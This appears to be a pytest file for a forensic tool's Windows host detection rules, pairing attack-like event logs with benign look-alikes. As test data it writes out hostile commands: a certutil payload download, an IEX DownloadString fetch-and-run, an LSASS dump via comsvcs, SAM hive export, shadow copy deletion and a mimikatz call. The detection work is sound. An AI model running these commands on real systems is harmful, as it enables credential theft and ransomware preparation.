"""Host detection rules (core/host_detections.py) over Windows events.

Events are built by the real EVTX mapping (record_to_event on Security-log
shaped XML) rather than constructed by hand, so these tests also pin that
the parser produces what the rules read - the two sides of one contract.
Each rule gets a positive case AND the benign look-alike it must not flag.
"""

from datetime import datetime, timedelta, timezone

from netforensicai.core.detections import _rules_for_event, scan_case
from netforensicai.core.event import Event, EventSequence
from netforensicai.core.host_detections import (
    BRUTE_FORCE_MIN_FAILURES,
    SPRAY_MIN_ACCOUNTS,
    _account_key,
    host_rules_for_event,
)
from netforensicai.core.store import CaseStore
from netforensicai.parsers.evtx import record_to_event

_NS = "http://schemas.microsoft.com/win/2004/08/events/event"
_T0 = datetime(2026, 9, 20, 3, 0, 0, tzinfo=timezone.utc)
_SEQ = EventSequence()


def _win(event_id, data, provider="Microsoft-Windows-Security-Auditing", at=0):
    data_xml = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    when = (_T0 + timedelta(seconds=at)).isoformat().replace("T", " ")
    xml = f"""<Event xmlns="{_NS}"><System><Provider Name="{provider}"></Provider>
<EventID>{event_id}</EventID><TimeCreated SystemTime="{when}"></TimeCreated>
<EventRecordID>1</EventRecordID><Channel>Security</Channel><Computer>DC01</Computer>
</System><EventData>{data_xml}</EventData></Event>"""
    return record_to_event(xml, evidence_id="EV-0001", sequence=_SEQ)


def _proc(image, command, parent=r"C:\Windows\explorer.exe"):
    return _win(
        4688,
        {"SubjectUserName": "alice", "SubjectDomainName": "CORP", "NewProcessName": image,
         "CommandLine": command, "ParentProcessName": parent},
    )


def _ids(event):
    return [rule[0] for rule in host_rules_for_event(event)]


def _scan(tmp_path, events):
    with CaseStore(tmp_path) as store:
        store.replace_events_for_evidence("EV-0001", events)
        return scan_case(store)


# --- per-event rules ---


def test_log_cleared():
    event = _win(1102, {"SubjectUserName": "mallory", "SubjectDomainName": "CORP"}, provider="Microsoft-Windows-Eventlog")
    rules = list(host_rules_for_event(event))
    assert [r[0] for r in rules] == ["LOG-CLEARED"]
    assert rules[0][2] == "high"
    assert "T1070.001" in rules[0][3]
    assert r"CORP\mallory" in rules[0][3]


def test_office_spawning_powershell():
    event = _proc(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell -nop",
                  parent=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE")
    assert "OFFICE-SPAWNED-SHELL" in _ids(event)


def test_office_spawning_office_is_fine():
    event = _proc(r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", "excel.exe /dde",
                  parent=r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE")
    assert _ids(event) == []


def test_encoded_powershell():
    event = _proc(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                  "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")
    assert "ENCODED-POWERSHELL" in _ids(event)
    short = _proc(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell -e cmd")
    assert "ENCODED-POWERSHELL" not in _ids(short)


def test_certutil_download_vs_ordinary_use():
    bad = _proc(r"C:\Windows\System32\certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe a.exe")
    good = _proc(r"C:\Windows\System32\certutil.exe", "certutil.exe -verify cert.cer")
    assert _ids(bad) == ["LOLBIN-DOWNLOAD"]
    assert _ids(good) == []


def test_lsass_dump_via_comsvcs():
    event = _proc(r"C:\Windows\System32\rundll32.exe",
                  r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\l.dmp full")
    rules = list(host_rules_for_event(event))
    assert rules[0][0] == "LSASS-DUMP"
    assert "T1003.001" in rules[0][3]
    # One rule per command, even though rundll32 has a second pattern.
    assert len(rules) == 1


def test_shadow_copy_deletion():
    event = _proc(r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe Delete Shadows /All /Quiet")
    assert _ids(event) == ["INHIBIT-RECOVERY"]
    assert _ids(_proc(r"C:\Windows\System32\vssadmin.exe", "vssadmin list shadows")) == []


def test_hive_export():
    event = _proc(r"C:\Windows\System32\reg.exe", r"reg.exe save HKLM\SAM C:\temp\sam.save")
    assert _ids(event) == ["CREDENTIAL-HIVE-EXPORT"]


def test_suspicious_powershell_script_block():
    event = _win(
        4104,
        {"MessageNumber": "1", "MessageTotal": "1",
         "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/p.ps1')"},
        provider="Microsoft-Windows-PowerShell",
    )
    assert _ids(event) == ["SUSPICIOUS-POWERSHELL"]


def test_ordinary_script_block_is_fine():
    event = _win(
        4104,
        {"ScriptBlockText": '$ErrorActionPreference = "Stop"; Get-ChildItem C:\\Users | Select-Object Name'},
        provider="Microsoft-Windows-PowerShell",
    )
    assert _ids(event) == []


def test_psexec_service_install():
    event = _win(7045, {"ServiceName": "PSEXESVC", "ImagePath": r"%SystemRoot%\PSEXESVC.exe", "AccountName": "LocalSystem"},
                 provider="Service Control Manager")
    assert _ids(event) == ["SUSPICIOUS-SERVICE"]


def test_driver_service_install_is_fine():
    # Seen on a real Windows 11 System log: Defender's driver.
    event = _win(7045, {"ServiceName": "KslD", "ImagePath": r"system32\drivers\wd\KslD.sys"},
                 provider="Service Control Manager")
    assert _ids(event) == []


def test_scheduled_task_running_powershell_from_appdata():
    content = "&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;Arguments&gt;-w hidden -f C:\\Users\\a\\AppData\\x.ps1&lt;/Arguments&gt;&lt;/Exec&gt;"
    event = _win(4698, {"SubjectUserName": "alice", "TaskName": r"\Updater", "TaskContent": content})
    assert _ids(event) == ["SUSPICIOUS-SCHEDULED-TASK"]


def test_privileged_group_add():
    admins = _win(4732, {"MemberSid": "S-1-5-21-1-2-3-1337", "TargetUserName": "Administrators", "SubjectUserName": "mallory"})
    rdp = _win(4732, {"MemberSid": "S-1-5-21-1-2-3-1337", "TargetUserName": "Remote Desktop Users"})
    other = _win(4732, {"MemberSid": "S-1-5-21-1-2-3-1337", "TargetUserName": "Marketing"})
    assert [(r[0], r[2]) for r in host_rules_for_event(admins)] == [("PRIVILEGED-GROUP-CHANGE", "high")]
    assert [(r[0], r[2]) for r in host_rules_for_event(rdp)] == [("PRIVILEGED-GROUP-CHANGE", "medium")]
    assert _ids(other) == []


def test_external_rdp_logon_only_for_public_source():
    # A genuinely routable address: the 203.0.113.0/24 documentation range
    # used elsewhere in these tests is (correctly) not "external".
    external = _win(4624, {"TargetUserName": "alice", "LogonType": "10", "IpAddress": "45.33.32.156"})
    internal = _win(4624, {"TargetUserName": "alice", "LogonType": "10", "IpAddress": "10.0.0.5"})
    network = _win(4624, {"TargetUserName": "alice", "LogonType": "3", "IpAddress": "203.0.113.50"})
    assert _ids(external) == ["EXTERNAL-RDP-LOGON"]
    assert _ids(internal) == []
    assert _ids(network) == []


def test_new_credentials_logon():
    event = _win(4624, {"TargetUserName": "alice", "LogonType": "9", "LogonProcessName": "seclogo"})
    assert _ids(event) == ["NEW-CREDENTIALS-LOGON"]


def test_offensive_tool_rule_matches_full_windows_path():
    # Regression: Sysmon Image / 4688 NewProcessName are full paths, and the
    # rule compared the whole value against bare names, so it never fired.
    event = _proc(r"C:\Users\bob\Downloads\mimikatz.exe", "mimikatz.exe privilege::debug")
    assert [r[0] for r in _rules_for_event(event)] == ["OFFENSIVE-TOOL-NAME"]


def test_account_key_normalizes_domain_forms():
    assert _account_key(r"CORP\Bob") == _account_key("bob@corp.local") == _account_key("BOB") == "bob"


# --- aggregate rules, through scan_case ---


def _failure(user, ip, at):
    return _win(4625, {"TargetUserName": user, "TargetDomainName": "CORP", "Status": "0xC000006D",
                       "SubStatus": "0xC000006A", "LogonType": "3", "IpAddress": ip}, at=at)


def _success(user, ip, at, logon_type="3"):
    return _win(4624, {"TargetUserName": user, "TargetDomainName": "CORP", "LogonType": logon_type, "IpAddress": ip}, at=at)


def _by_rule(detections):
    return {d["rule_id"]: d for d in detections}


def test_brute_force_then_success(tmp_path):
    events = [_failure("admin", "198.51.100.7", i) for i in range(BRUTE_FORCE_MIN_FAILURES)]
    events.append(_success("admin", "198.51.100.7", 100))
    found = _by_rule(_scan(tmp_path, events))

    assert found["BRUTE-FORCE-SUCCESS"]["severity"] == "high"
    assert found["BRUTE-FORCE-SUCCESS"]["event_id"] == events[-1].event_id
    assert "BRUTE-FORCE" not in found


def test_brute_force_without_success(tmp_path):
    events = [_failure("admin", "198.51.100.7", i) for i in range(BRUTE_FORCE_MIN_FAILURES)]
    found = _by_rule(_scan(tmp_path, events))
    assert found["BRUTE-FORCE"]["severity"] == "medium"
    assert "BRUTE-FORCE-SUCCESS" not in found


def test_success_before_failures_is_not_brute_force_success(tmp_path):
    events = [_success("admin", "10.0.0.5", 0)]
    events += [_failure("admin", "198.51.100.7", 10 + i) for i in range(BRUTE_FORCE_MIN_FAILURES)]
    found = _by_rule(_scan(tmp_path, events))
    assert "BRUTE-FORCE-SUCCESS" not in found
    assert "BRUTE-FORCE" in found


def test_a_few_typos_are_not_brute_force(tmp_path):
    events = [_failure("alice", "10.0.0.5", i) for i in range(3)] + [_success("alice", "10.0.0.5", 10)]
    found = _by_rule(_scan(tmp_path, events))
    assert not {"BRUTE-FORCE", "BRUTE-FORCE-SUCCESS", "PASSWORD-SPRAY"} & set(found)


def test_brute_force_counts_kerberos_and_ntlm_names_as_one_account(tmp_path):
    # 4771 logs a bare name, 4625/4624 carry the domain.
    half = BRUTE_FORCE_MIN_FAILURES // 2
    events = [_failure("admin", "198.51.100.7", i) for i in range(half)]
    events += [_win(4771, {"TargetUserName": "admin", "Status": "0x18", "IpAddress": "::ffff:198.51.100.7"}, at=50 + i)
               for i in range(BRUTE_FORCE_MIN_FAILURES - half)]
    events.append(_success("admin", "198.51.100.7", 200))
    assert "BRUTE-FORCE-SUCCESS" in _by_rule(_scan(tmp_path, events))


def test_password_spray_with_success(tmp_path):
    users = [f"user{i}" for i in range(SPRAY_MIN_ACCOUNTS)]
    events = [_failure(u, "203.0.113.66", i) for i, u in enumerate(users)]
    events.append(_success("user3", "203.0.113.66", 100))
    found = _by_rule(_scan(tmp_path, events))
    assert found["PASSWORD-SPRAY"]["severity"] == "high"
    assert "203.0.113.66" in found["PASSWORD-SPRAY"]["description"]


def test_machine_account_success_does_not_complete_brute_force(tmp_path):
    events = [_failure("SRV01$", "10.0.0.9", i) for i in range(BRUTE_FORCE_MIN_FAILURES)]
    events.append(_success("SRV01$", "10.0.0.9", 100))
    found = _by_rule(_scan(tmp_path, events))
    assert "BRUTE-FORCE-SUCCESS" not in found


def _ticket(service, enc="0x17", user="alice", at=0):
    return _win(4769, {"TargetUserName": user, "TargetDomainName": "CORP", "ServiceName": service,
                       "TicketEncryptionType": enc, "IpAddress": "::ffff:10.0.0.23", "Status": "0x0"}, at=at)


def test_kerberoasting_many_services_is_high(tmp_path):
    events = [_ticket(s, at=i) for i, s in enumerate(["MSSQLSvc", "svc_backup", "svc_web"])]
    found = _by_rule(_scan(tmp_path, events))
    assert found["KERBEROASTING"]["severity"] == "high"
    assert "3 service(s)" in found["KERBEROASTING"]["description"]


def test_kerberoasting_ignores_aes_machine_accounts_and_krbtgt(tmp_path):
    events = [_ticket("svc_sql", enc="0x12"), _ticket("DC01$"), _ticket("krbtgt")]
    assert "KERBEROASTING" not in _by_rule(_scan(tmp_path, events))


def test_detection_ids_are_stable_across_rescans(tmp_path):
    events = [_failure("admin", "198.51.100.7", i) for i in range(BRUTE_FORCE_MIN_FAILURES)]
    events.append(_proc(r"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /all"))
    with CaseStore(tmp_path) as store:
        store.replace_events_for_evidence("EV-0001", events)
        first = sorted(d["detection_id"] for d in scan_case(store))
        second = sorted(d["detection_id"] for d in scan_case(store))
    assert first == second
    assert len(first) == len(set(first))


def test_benign_host_activity_raises_nothing(tmp_path):
    events = [
        _success("alice", "10.0.0.5", 0, logon_type="2"),
        _proc(r"C:\Windows\System32\notepad.exe", "notepad.exe notes.txt"),
        _proc(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe Get-Process"),
        _win(4634, {"TargetUserName": "alice", "LogonType": "2"}, at=60),
        _ticket("svc_sql", enc="0x12"),
    ]
    assert _scan(tmp_path, events) == []


def test_rules_tolerate_sparse_events():
    # Hand-made JSON/CSV events carry none of the EVTX raw data.
    for event_type in ("logon_success", "group_member_added", "service_installed",
                       "scheduled_task_created", "powershell_script_block", "process_start"):
        event = Event(event_id="E1", evidence_id="EV-0001", source="json", event_type=event_type)
        assert list(host_rules_for_event(event)) == []


# --- narrative integration ---


def test_every_bundled_rule_has_a_narrative_phase():
    # A rule missing from RULE_PHASE silently lands in "Other observations".
    import pathlib
    import re

    from netforensicai.core import detections, host_detections
    from netforensicai.core.narrative import PHASES, RULE_PHASE

    source = "".join(pathlib.Path(m.__file__).read_text(encoding="utf-8") for m in (detections, host_detections))
    rule_ids = set(re.findall(r'"([A-Z][A-Z0-9]+(?:-[A-Z0-9]+)+)"', source))
    assert rule_ids - set(RULE_PHASE) == set()
    assert set(RULE_PHASE.values()) <= {key for key, _title in PHASES}


def test_ransomware_prep_leads_the_narrative(tmp_path):
    from netforensicai.core import narrative as narrative_module

    events = [_proc(r"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /all /quiet")]
    events += [_failure("admin", "198.51.100.7", i) for i in range(BRUTE_FORCE_MIN_FAILURES)]
    with CaseStore(tmp_path) as store:
        store.replace_events_for_evidence("EV-0001", events)
        scan_case(store)
        story = narrative_module.build(store)
    phases = [key for key, _title, _beats in story.phases]
    assert phases.index("credential-access") < phases.index("impact")
    assert "ransomware" in story.assessment
    assert story.severity == "critical"
